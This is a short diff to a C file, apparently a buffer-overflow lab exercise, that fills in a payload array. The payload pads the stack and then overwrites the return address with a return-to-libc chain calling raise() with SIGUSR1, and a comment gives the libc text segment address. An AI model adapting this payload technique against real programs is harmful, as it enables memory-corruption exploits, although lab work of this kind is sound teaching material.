@@ -21,11 +21,16 @@ unsigned char payload[] =
 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 	"XXXXXXXXXXXX"
 	/* ------------------------------------	*/
-	/* FIXME */
+	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
 	/* ------------------------------------	*/
-	"\xef\xbe\xad\xde";
-	/* ------------------------------------	*/
+	"\x40\x8d\xe8\xb5"	// Address of raise (in memory)
+	"\xef\xbe\xad\xde"	// Fake return address
+	"\x0a\x00\x00\x00"	// SIGUSR1
 
+	/* USEFUL NOTES */
+	// 0xb5e710f0 is start address of libc text segment
+
+;
 
 int
 main(int argc, char **argv)
